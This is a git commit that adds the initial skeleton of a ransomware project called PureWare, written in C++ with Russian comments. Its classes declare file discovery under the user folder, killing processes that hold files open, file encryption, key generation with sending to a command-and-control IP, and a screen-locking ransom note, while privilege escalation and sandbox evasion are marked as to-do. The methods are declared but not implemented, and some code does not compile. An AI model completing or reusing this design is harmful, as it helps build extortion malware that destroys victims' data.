78e14663f9b4adce8aa221eca75d5d2eadf13d8a
cybersec_21 <V46dABMwRrjR3@proton.me>
2024-02-17 11:45:47 +0300

    initial commit

---
+++ PureWare.cpp
@@ -0,0 +1,82 @@
+﻿#include "PureWare.hpp"
+
+using namespace std;;
+using path_t = std::filesystem::path;
+
+
+// Нам надо этот файлик разделить на несколько, чтоб норм структура была и чтобы не париться потом с гитом и тд
+
+using namespace std; // норм пока разработка 
+
+// All about files
+class FileModule
+{
+private:
+    int KillActiveFile() const; // Чекает используется ли файл и убивает процесс, который его юзает
+    int DirectoryCheck() const; // Если директорию не нужно шифровать, возвращает  0
+
+    path_t directory; // Директория, которую вернёт метод FindDirectory
+    size_t fileOrder; // Здесь хранится номер файла который сейчас вернёт GetNextFile или типа того
+
+public:
+    FileModule();  // объявляем конструктор 
+    void FindDirectory(); // Ищет наименьшую директорию, на которую у нас есть права "C:\Users\{Username}\" и записывает в атрибут directory
+    path_t GetNextFile() const; // возвращает следующий файл, который необходимо зашифровать либо Null если закончились
+};
+
+// All about cipher
+class CipherModule
+{
+public:
+    std::string key;
+    CipherModule(std::string key); // объявляем конструктор передавая ключ которым надо всё шифровать, он запишет его в атрибут key
+    int Cipher(path_t file) const; // Передаём файл который надо зашифровать, возращает 0 если всё ок
+};
+
+// Generate cipher key and send it to the specified C2
+class KeyModule
+{
+public:
+    std::string key;
+    KeyModule(std::string C2Address); // Передаём хост который получит ключ
+    void KeyGen(); // Запишет в атрибут key сгенеренный ключ
+    int SendKey() const; // Отправит ключ на сервак указанный при создании шаблона класса
+};
+
+// Block everything and create a desktop shity note // Надо дописать так, чтобы можно было кастомить
+class NoteModule
+{
+public:
+    NoteModule();
+    void MakeSomeShit(); // Блокает к херам всё и выводит надпись
+};
+
+// Escalate our privileges to local admin if not already
+// class PrivEscModule { # ToDo # };
+
+// Check if we are in a sandbox and if true > do nothing  
+// class SandboxEvasionModule { # ToDo # };
+
+int main(void)
+{
+    setlocale(LC_ALL, "Russian");
+    FileModule fileModule;
+    fileModule.FindDirectory();
+
+
+    KeyModule key(C2_IP_ADDRESS);
+    key.KeyGen();
+
+    CipherModule PureWare(key.key);
+    NoteModule note;
+
+    // Нужно подумать как это дерьмо оптимизировать, кажется сейчас оно будет шифровать супер медленно
+    for (; !endProgramExecution;) {
+        PureWare.Cipher(fileModule.GetNextFile());
+    }
+
+    note.MakeSomeShit();
+
+    return 0;
+}
+
---
+++ PureWare.hpp
@@ -0,0 +1,14 @@
+﻿#ifndef PUREWARE_PUREWARE_HPP_
+#define PUREWARE_PUREWARE_HPP_
+
+#pragma once
+
+#include <iostream>
+#include <filesystem>
+#include <Windows.h>
+#include <locale>
+
+
+#define C2_IP_ADDRESS "192.168.255.254"
+
+#endif // PUREWARE_PUREWARE_HPP_
